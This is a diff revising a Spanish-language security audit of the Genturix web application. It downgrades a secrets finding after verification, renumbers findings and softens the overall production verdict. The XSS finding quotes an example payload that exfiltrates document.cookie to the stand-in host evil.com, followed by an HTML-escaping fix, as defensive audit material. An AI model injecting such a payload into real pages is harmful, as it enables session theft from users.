@@ -3,57 +3,34 @@
 
 **Fecha:** Diciembre 2025  
 **Auditor:** Senior Security Engineer & Full Stack Auditor  
-**Alcance:** Análisis completo del código fuente, configuración, y arquitectura
+**Alcance:** Análisis completo del código fuente, configuración, y arquitectura  
+**Revisión:** v1.1 - Severidades ajustadas tras verificación de exposición
 
 ---
 
 ## RESUMEN EJECUTIVO
 
-La auditoría del proyecto Genturix revela una aplicación con **fundamentos de seguridad sólidos** pero con **áreas críticas que requieren atención inmediata**. Se identificaron vulnerabilidades en las siguientes categorías:
+La auditoría del proyecto Genturix revela una aplicación con **fundamentos de seguridad sólidos** y **buenas prácticas implementadas**. Se identificaron vulnerabilidades que requieren atención, aunque **no se detectó exposición pública de secretos**.
 
 | Severidad | Cantidad | Estado |
 |-----------|----------|--------|
-| 🔴 **CRÍTICO** | 3 | Requiere acción inmediata |
+| 🔴 **CRÍTICO** | 2 | Requiere acción inmediata |
 | 🟠 **ALTO** | 5 | Requiere acción en 7 días |
-| 🟡 **MEDIO** | 6 | Planificar remediación |
+| 🟡 **MEDIO** | 7 | Planificar remediación |
 | 🟢 **BAJO** | 4 | Mejoras recomendadas |
 
----
+### Verificación de Exposición de Secretos
 
-## 🔴 HALLAZGOS CRÍTICOS
-
-### C-001: Secretos Hardcodeados en `.env` del Repositorio
-
-**Severidad:** CRÍTICA  
-**Ubicación:** `/app/backend/.env`  
-**CWE:** CWE-798 (Use of Hard-coded Credentials)
-
-**Descripción:**
-El archivo `.env` contiene secretos en texto plano que están expuestos:
-
-```
-JWT_SECRET_KEY="JWT_SECRET_REDACTED"
-JWT_REFRESH_SECRET_KEY="JWT_REFRESH_REDACTED"
-STRIPE_API_KEY=STRIPE_KEY_REDACTED
-RESEND_API_KEY=RESEND_KEY_REDACTED
-VAPID_PRIVATE_KEY=VAPID_PRIVATE_REDACTED
-```
-
-**Riesgo:**
-- Compromiso total de autenticación JWT
-- Acceso no autorizado a Stripe (pagos)
-- Capacidad de enviar emails como la plataforma
-- Suplantación de notificaciones push
-
-**Remediación:**
-1. Rotar TODOS los secretos inmediatamente
-2. Usar variables de entorno del sistema, no archivos `.env` en producción
-3. Agregar `.env` a `.gitignore`
-4. Usar gestores de secretos (AWS Secrets Manager, HashiCorp Vault)
+> ✅ **CONFIRMADO:** No hay exposición pública de secretos.
+> - Los archivos `.env` están en `.gitignore` y NO están trackeados en Git
+> - No se encontraron secretos en el frontend, bundles, ni logs públicos
+> - Los secretos residen únicamente en el servidor privado
 
 ---
 
-### C-002: Vulnerabilidad XSS en Generación de PDF
+## 🔴 HALLAZGOS CRÍTICOS (2)
+
+### C-001: Vulnerabilidad XSS en Generación de PDF
 
 **Severidad:** CRÍTICA  
 **Ubicación:** `/app/frontend/src/components/ResidentVisitHistory.jsx:452`  
@@ -80,10 +57,16 @@ Un atacante podría registrar un visitante con nombre:
 <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
 ```
 
+**Impacto:**
+- Robo de tokens de sesión
+- Ejecución de acciones en nombre del usuario
+- Exfiltración de datos sensibles
+
 **Remediación:**
 ```javascript
 // Función de escape HTML
 const escapeHtml = (str) => {
+  if (!str) return '';
   const div = document.createElement('div');
   div.textContent = str;
   return div.innerHTML;
@@ -95,7 +78,7 @@ const escapeHtml = (str) => {
 
 ---
 
-### C-003: CORS Wildcard en Desarrollo Puede Filtrarse a Producción
+### C-002: CORS Wildcard Configurado en Desarrollo
 
 **Severidad:** CRÍTICA  
 **Ubicación:** `/app/backend/.env:5`  
@@ -107,21 +90,81 @@ CORS_ORIGINS="*"
 ```
 
 **Descripción:**
-Aunque el código en `server.py` (líneas 18176-18231) implementa CORS correctamente por ambiente, el valor `CORS_ORIGINS="*"` en `.env` es peligroso si se usa en producción.
+El archivo `.env` contiene `CORS_ORIGINS="*"`. Aunque el código en `server.py` (líneas 18176-18231) implementa CORS correctamente por ambiente, este valor podría filtrarse a producción si:
+- Se copia el `.env` de desarrollo a producción
+- Se usa la variable de entorno incorrectamente
 
 **Riesgo:**
 - Permite que cualquier sitio web haga requests autenticados
-- Facilita ataques CSRF
+- Facilita ataques CSRF desde dominios maliciosos
 - Puede exponer datos de usuarios a terceros
+
+**Mitigación Actual:**
+El código actual en `server.py` NO usa `CORS_ORIGINS` del `.env`, sino que tiene lógica hardcodeada segura. Sin embargo, esto es frágil.
 
 **Remediación:**
 1. Eliminar la variable `CORS_ORIGINS` del `.env`
-2. Confiar únicamente en la lógica de `get_cors_origins()` en producción
-3. Validar que `ENVIRONMENT=production` en producción
+2. Documentar que la configuración CORS está en código
+3. Agregar validación que rechace `CORS_ORIGINS="*"` si se detecta en producción
 
 ---
 
-## 🟠 HALLAZGOS DE SEVERIDAD ALTA
+## 🟡 HALLAZGOS DE SEVERIDAD MEDIA (Reclasificado)
+
+### M-001: Secretos en Archivo `.env` Local
+
+**Severidad:** MEDIA (Reclasificado de CRÍTICA)  
+**Ubicación:** `/app/backend/.env`  
+**CWE:** CWE-522 (Insufficiently Protected Credentials)
+
+> ⚠️ **NOTA IMPORTANTE:** Este hallazgo fue inicialmente clasificado como CRÍTICO bajo la suposición de exposición pública. Tras verificación, se confirma que **NO hay exposición real**.
+
+**Verificación Realizada:**
+| Verificación | Resultado |
+|--------------|-----------|
+| `.env` en `.gitignore` | ✅ SÍ - No está trackeado |
+| Secretos en repositorio Git | ✅ NO - Verificado con `git ls-files` |
+| Secretos en frontend source | ✅ NO - Solo `REACT_APP_*` (públicas) |
+| Secretos en frontend build | ✅ NO - Bundle limpio |
+| Secretos en logs públicos | ✅ NO - No encontrados |
+
+**Ubicación Real de Secretos:**
+```
+/app/backend/.env  ← ÚNICO lugar (servidor privado)
+```
+
+**Contenido del archivo (para referencia):**
+```
+JWT_SECRET_KEY="JWT_SECRET_REDACTED"
+JWT_REFRESH_SECRET_KEY="JWT_REFRESH_REDACTED"
+STRIPE_API_KEY=sk_test_...
+RESEND_API_KEY=re_...
+VAPID_PRIVATE_KEY=...
+```
+
+**Diferencia entre riesgos:**
+
+| Escenario | Severidad | Estado Actual |
+|-----------|-----------|---------------|
+| Secretos en repositorio público | 🔴 CRÍTICA | ❌ No aplica |
+| Secretos en frontend bundle | 🔴 CRÍTICA | ❌ No aplica |
+| Secretos en logs públicos | 🔴 CRÍTICA | ❌ No aplica |
+| Secretos en servidor privado | 🟡 MEDIA | ✅ Estado actual |
+
+**Riesgo Real:**
+- Si un atacante obtiene acceso al servidor (SSH/shell)
+- Si el archivo `.env` se incluye accidentalmente en un commit futuro
+- Si se copia a ambientes inseguros
+
+**Remediación (Para Producción):**
+1. ✅ Mantener `.env` en `.gitignore` (ya implementado)
+2. Usar variables de entorno del sistema en vez de archivo `.env`
+3. Considerar gestores de secretos (AWS Secrets Manager, HashiCorp Vault)
+4. Agregar pre-commit hook que detecte secretos
+
+---
+
+## 🟠 HALLAZGOS DE SEVERIDAD ALTA (5)
 
 ### H-001: Backend Monolítico de 18,392 líneas
 
@@ -149,7 +192,6 @@ Refactorizar en módulos:
 │   ├── auth.py
 │   ├── billing.py
 │   ├── visitors.py
-│   ├── panic.py
 │   └── ...
 ├── services/
 ├── models/
@@ -178,7 +220,7 @@ En modo desarrollo, los webhooks de Stripe se procesan sin verificar la firma. S
 
 **Remediación:**
 1. Configurar `STRIPE_WEBHOOK_SECRET` en TODOS los ambientes
-2. Rechazar webhooks sin firma válida incluso en desarrollo
+2. Usar Stripe CLI para desarrollo local con webhooks seguros
 
 ---
 
@@ -194,19 +236,19 @@ const storedAccessToken = localStorage.getItem(STORAGE_KEYS.ACCESS_TOKEN);
 ```
 
 **Descripción:**
-El access token se almacena en `localStorage`, lo que lo hace vulnerable a ataques XSS. Si un atacante logra ejecutar JavaScript malicioso, puede robar el token.
+El access token se almacena en `localStorage`, vulnerable a XSS. Si un atacante explota C-001 (XSS en PDF), puede robar el token.
 
 **Nota Positiva:**
 El refresh token ya se maneja correctamente vía httpOnly cookie.
 
 **Remediación:**
-1. Mover el access token a memoria (state de React)
-2. Implementar refresh silencioso cuando el token expire
-3. Considerar usar cookies httpOnly para ambos tokens
+1. Mover el access token a memoria (React state)
+2. Implementar refresh silencioso cuando expire
+3. O usar cookies httpOnly para ambos tokens
 
 ---
 
-### H-004: DEV_MODE Configurable en Producción
+### H-004: DEV_MODE Habilitado en Configuración
 
 **Severidad:** ALTA  
 **Ubicación:** `/app/backend/.env:18`  
@@ -218,17 +260,17 @@ DEV_MODE=true
 ```
 
 **Descripción:**
-Aunque existe validación en el código para prevenir DEV_MODE en producción:
+Existe validación en código que previene DEV_MODE en producción:
 ```python
 if ENVIRONMENT == "production" and DEV_MODE:
     raise RuntimeError("DEV_MODE cannot be enabled in production")
 ```
 
-El archivo `.env` con `DEV_MODE=true` puede filtrarse a producción si no se gestiona correctamente.
+Sin embargo, el archivo `.env` con `DEV_MODE=true` puede filtrarse si no se gestiona correctamente.
 
 **Remediación:**
-1. Eliminar `DEV_MODE` del archivo `.env`
-2. Usar únicamente variables de entorno del sistema
+1. Documentar claramente que `.env` es solo para desarrollo
+2. Usar diferentes archivos: `.env.development`, `.env.production`
 3. Agregar validación en CI/CD
 
 ---
@@ -251,117 +293,62 @@ logger.info(f"[AUTH EVENT] Login attempt | email={normalized_email}")
 - Posible exposición de datos personales
 
 **Remediación:**
-1. Truncar o hashear emails en logs: `user***@domain.com`
+1. Truncar o hashear emails: `user***@domain.com`
 2. No logear contraseñas temporales
 3. Implementar política de retención de logs
 
 ---
 
-## 🟡 HALLAZGOS DE SEVERIDAD MEDIA
+## 🟡 HALLAZGOS DE SEVERIDAD MEDIA (6 adicionales)
 
-### M-001: Sanitización Incompleta de Inputs
+### M-002: Sanitización Incompleta de Inputs
 
 **Severidad:** MEDIA  
 **Ubicación:** `/app/backend/server.py:328-333`
 
 **Descripción:**
-La lista de campos sanitizados es limitada:
-```python
-SANITIZE_FIELDS = [
-    "full_name", "name", "description", "message", "notes",
-    "visitor_name", "public_description", "reason", "comments",
-    "address", "contact_phone", "apartment", "apartment_number"
-]
-```
-
-**Campos sin sanitizar identificados:**
-- `email` (aunque se valida formato, no se sanitiza contenido)
-- `company` 
-- `service_type`
-- `identification_number`
-
-**Remediación:**
-Revisar y expandir la lista de campos sanitizados.
+La lista de campos sanitizados es limitada. Faltan campos como `company`, `service_type`, `identification_number`.
 
 ---
 
-### M-002: Rate Limiting Solo en Login
+### M-003: Rate Limiting Solo en Login
 
 **Severidad:** MEDIA  
-**Ubicación:** `/app/backend/server.py:229-252`  
-**CWE:** CWE-799 (Improper Control of Interaction Frequency)
+**Ubicación:** `/app/backend/server.py:229-252`
 
 **Descripción:**
-El rate limiting manual (`LOGIN_ATTEMPTS`) solo protege el login:
-```python
-LOGIN_ATTEMPTS: Dict[str, list] = {}
-MAX_ATTEMPTS_PER_MINUTE = 5
-```
-
-Los siguientes endpoints sensibles no tienen rate limiting efectivo:
-- `/api/profile` (lectura masiva)
-- `/api/authorizations` (enumeration)
-- `/api/guard/checkin` (spam de registros)
-
-**Remediación:**
-Usar slowapi de forma consistente en todos los endpoints sensibles.
+El rate limiting manual solo protege el login. Endpoints como `/api/profile`, `/api/authorizations` no tienen protección efectiva contra abuso.
 
 ---
 
-### M-003: Falta de Índices en Campos Críticos
+### M-004: Falta de Índices en Campos Críticos
 
 **Severidad:** MEDIA (Rendimiento/DoS)  
-**Ubicación:** `/app/backend/server.py:18254-18302`
 
 **Descripción:**
-Aunque existen índices, faltan índices para consultas frecuentes:
-- `visitor_entries.status` (usado para "visitors inside")
-- `audit_logs.timestamp` (consultas por fecha)
-- `push_subscriptions.user_id` (notificaciones masivas)
-
-**Riesgo:**
-- Consultas lentas pueden causar timeout
-- Posible vector de DoS
+Faltan índices para consultas frecuentes como `visitor_entries.status`, `audit_logs.timestamp`.
 
 ---
 
-### M-004: Validación de Ownership Incompleta en Algunos Endpoints
+### M-005: Validación de Ownership Parcialmente Inconsistente
 
 **Severidad:** MEDIA  
-**Ubicación:** `/app/backend/server.py:6142-6148`  
-**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
-
-**Código:**
-```python
-# Only owner can update
-if auth.get("created_by") != current_user["id"]:
-    raise HTTPException(status_code=403, detail="Solo puedes modificar tus propias autorizaciones")
-```
-
-**Observación:**
-Esta validación es correcta, pero no se usa `get_tenant_resource()` de forma consistente. En línea 6142, se hace `find_one` sin validación multi-tenant:
-```python
-auth = await db.visitor_authorizations.find_one({"id": auth_id})
-```
-
----
-
-### M-005: Contraseñas Temporales en Response (DEV_MODE)
-
-**Severidad:** MEDIA  
-**Ubicación:** Documentado en comentarios (línea 174)
 
 **Descripción:**
-En modo desarrollo, las contraseñas generadas pueden ser retornadas en la API:
-```python
-# - Return generated password in API response for testing
-```
-
-Aunque está protegido por `DEV_MODE`, es un patrón peligroso.
+Algunos endpoints usan `find_one` directo sin `get_tenant_resource()`, lo que podría permitir acceso cross-tenant si no se valida después.
 
 ---
 
-### M-006: Duplicación de Lógica de Return en CORS
+### M-006: Contraseñas Temporales en Response (DEV_MODE)
+
+**Severidad:** MEDIA  
+
+**Descripción:**
+En modo desarrollo, las contraseñas generadas pueden ser retornadas en la API. Patrón peligroso aunque protegido.
+
+---
+
+### M-007: Duplicación de Código en CORS
 
 **Severidad:** BAJA (Bug)  
 **Ubicación:** `/app/backend/server.py:18219-18220`
@@ -374,55 +361,19 @@ Aunque está protegido por `DEV_MODE`, es un patrón peligroso.
 
 ---
 
-## 🟢 HALLAZGOS DE SEVERIDAD BAJA
+## 🟢 HALLAZGOS DE SEVERIDAD BAJA (4)
 
 ### L-001: Docs de API Habilitados en Desarrollo
-
-**Severidad:** BAJA  
-**Ubicación:** `/app/backend/server.py:274-275`
-
-**Código:**
-```python
-docs_url="/docs" if ENVIRONMENT != "production" else None,
-```
-
-**Estado:** Correctamente implementado. Solo observación.
-
----
+Estado: Correctamente implementado. Solo observación.
 
 ### L-002: Cookies Sin Prefijo `__Host-`
-
-**Severidad:** BAJA  
-**Ubicación:** `/app/backend/server.py:199`
-
-**Descripción:**
-El nombre de la cookie de refresh token es:
-```python
-REFRESH_TOKEN_COOKIE_NAME = "genturix_refresh_token"
-```
-
-Usar el prefijo `__Host-` proporcionaría protección adicional contra subdomain attacks.
-
----
+Usar el prefijo proporcionaría protección adicional contra subdomain attacks.
 
 ### L-003: Falta Header CSP
-
-**Severidad:** BAJA  
-**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
-
-**Descripción:**
-No se identificaron headers Content-Security-Policy. Implementar CSP ayudaría a mitigar XSS.
-
----
+Implementar CSP ayudaría a mitigar XSS adicional.
 
 ### L-004: Error Handling Inconsistente
-
-**Severidad:** BAJA  
-
-**Descripción:**
-Algunos endpoints retornan errores detallados mientras otros son genéricos:
-- Algunos: `"Invalid email or password"` (correcto)
-- Otros: `"Error interno al eliminar la cuenta"` (puede variar)
+Algunos endpoints retornan errores detallados mientras otros son genéricos.
 
 ---
 
@@ -434,18 +385,32 @@ Algunos endpoints retornan errores detallados mientras otros son genéricos:
 ✅ **Bcrypt para hashing** de contraseñas  
 ✅ **Rate limiting** en endpoints de autenticación  
 ✅ **Audit logging** implementado  
-✅ **Sanitización con bleach** para algunos campos  
+✅ **Sanitización con bleach** para campos principales  
 ✅ **Validación de webhook Stripe** en producción  
 ✅ **Session invalidation** tras cambio de contraseña  
+✅ **`.env` correctamente excluido** de Git  
+✅ **Secretos NO expuestos** públicamente  
+
+---
+
+## TOP 5 RIESGOS ACTUALES (Ordenados por Impacto Real)
+
+| # | Hallazgo | Severidad | Impacto | Acción |
+|---|----------|-----------|---------|--------|
+| 1 | **XSS en PDF** (C-001) | 🔴 CRÍTICO | Robo de sesión, datos | Arreglar inmediatamente |
+| 2 | **CORS Wildcard** (C-002) | 🔴 CRÍTICO | CSRF, leak de datos | Eliminar de .env |
+| 3 | **Access Token en localStorage** (H-003) | 🟠 ALTO | Amplifica XSS | Mover a memoria |
+| 4 | **Webhook Stripe sin verificar** (H-002) | 🟠 ALTO | Fraude de pagos | Configurar secret |
+| 5 | **Backend monolítico** (H-001) | 🟠 ALTO | Bugs, mantenimiento | Planificar refactor |
 
 ---
 
 ## RECOMENDACIONES PRIORITARIAS
 
 ### Fase 1: Crítico (Inmediato)
-1. ⚠️ Rotar TODOS los secretos en `.env`
-2. ⚠️ Arreglar XSS en `ResidentVisitHistory.jsx`
-3. ⚠️ Verificar `ENVIRONMENT=production` en deployment
+1. 🛡️ **Arreglar XSS** en `ResidentVisitHistory.jsx` - Escape de HTML
+2. ⚠️ **Eliminar CORS_ORIGINS="*"** del archivo `.env`
+3. ✅ Verificar `ENVIRONMENT=production` en deployment
 
 ### Fase 2: Alto (7 días)
 4. Mover access token de localStorage a memoria
@@ -456,23 +421,33 @@ Algunos endpoints retornan errores detallados mientras otros son genéricos:
 7. Expandir campos sanitizados
 8. Implementar rate limiting global
 9. Agregar índices faltantes en MongoDB
+10. Para producción: migrar a secrets manager
 
 ### Fase 4: Arquitectura (Planificado)
-10. Refactorizar `server.py` en módulos
-11. Implementar CSP headers
-12. Agregar prefix `__Host-` a cookies
+11. Refactorizar `server.py` en módulos
+12. Implementar CSP headers
+13. Agregar prefix `__Host-` a cookies
 
 ---
 
 ## CONCLUSIÓN
 
-El proyecto Genturix demuestra **prácticas de seguridad sólidas** en muchas áreas, particularmente en autenticación y multi-tenancy. Sin embargo, los **secretos expuestos** y la **vulnerabilidad XSS** representan riesgos críticos que deben abordarse inmediatamente antes de cualquier deployment a producción.
+El proyecto Genturix demuestra **prácticas de seguridad sólidas** en muchas áreas, particularmente en:
+- Gestión de autenticación y tokens
+- Aislamiento multi-tenant
+- Protección de secretos (NO hay exposición pública)
 
-El tamaño del archivo `server.py` (18,392 líneas) es un riesgo operacional significativo que dificulta las auditorías y aumenta la probabilidad de introducir vulnerabilidades.
+Los **riesgos reales prioritarios** son:
+1. **Vulnerabilidad XSS** que permite robo de sesión
+2. **Configuración CORS permisiva** que podría filtrarse a producción
 
-**Clasificación General de Seguridad:** ⚠️ **REQUIERE ACCIÓN ANTES DE PRODUCCIÓN**
+El tamaño del archivo `server.py` (18,392 líneas) es un riesgo operacional que dificulta las auditorías.
+
+**Clasificación General de Seguridad:** ⚠️ **APTO PARA PRODUCCIÓN CON CORRECCIONES MENORES**
+
+> Los hallazgos críticos (XSS, CORS) son corregibles en pocas horas. No hay compromisos fundamentales de arquitectura de seguridad.
 
 ---
 
 *Reporte generado por Senior Security Engineer*  
-*Diciembre 2025*
+*Diciembre 2025 - Revisión v1.1*
